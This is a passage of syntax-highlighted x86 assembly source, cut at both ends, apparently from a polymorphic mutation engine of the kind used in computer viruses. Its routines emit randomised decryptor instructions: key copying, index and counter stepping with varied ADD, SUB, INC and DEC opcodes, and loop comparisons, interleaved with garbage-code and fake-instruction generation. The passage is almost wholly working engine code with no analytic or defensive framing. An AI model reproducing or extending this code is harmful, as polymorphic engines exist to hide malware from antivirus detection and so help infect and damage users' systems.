                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">counter_down</span><span class="sc0">
</span><span class="sc5">counter_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_ctr_dir</span><span class="sc0">
</span><span class="sc5">counter_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">done_ctr_dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Decrypt</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_decrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_crypt_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fake_or_not</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">perform_crypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_string</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_of_magic</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">last_spell</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_string</span><span class="sc0">
</span><span class="sc5">last_spell</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">
</span><span class="sc5">end_of_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Copy encryption key into work buffer taking care about operand size</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">copy_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_crypt_key</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_key</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Move index to next step</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get number of bytes to inc or dec the index reg</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_next_step</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get number of bytes to update with this instruction</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">loop_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Check direction</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">step_down</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_up</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_update</span><span class="sc0">

</span><span class="sc5">step_down</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_down</span><span class="sc0">

</span><span class="sc5">next_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_update</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_update</span><span class="sc0">
</span><span class="sc5">end_update</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Move index_reg up</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">do_step_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">up_with_inc</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_1</span><span class="sc0">

</span><span class="sc5">try_add_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate INC reg_index</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">up_with_inc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Move index_reg down</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">do_step_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">down_with_dec</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_2</span><span class="sc0">

</span><span class="sc5">try_add_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate DEC reg_index</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">down_with_dec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Next counter value</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check counter direction and update counter</span><span class="sc0">
                </span><span class="sc1">;using a INC or DEC instruction</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_next_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">upd_ctr_down</span><span class="sc0">
</span><span class="sc5">upd_ctr_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">upd_ctr_ok</span><span class="sc0">
</span><span class="sc5">upd_ctr_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">upd_ctr_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Loop</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Use counter reg in CMP instruction?</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">doloopauxreg</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Generate CMP counter_reg,end_value</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">doloopready</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get a random valid register to use in a CMP instruction</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">doloopauxreg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Move index reg value into aux reg</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Guess what!?</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">loop_use_cmp</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">loop_use_sub</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate ADD aux_reg,-end_value</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">loop_use_add</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
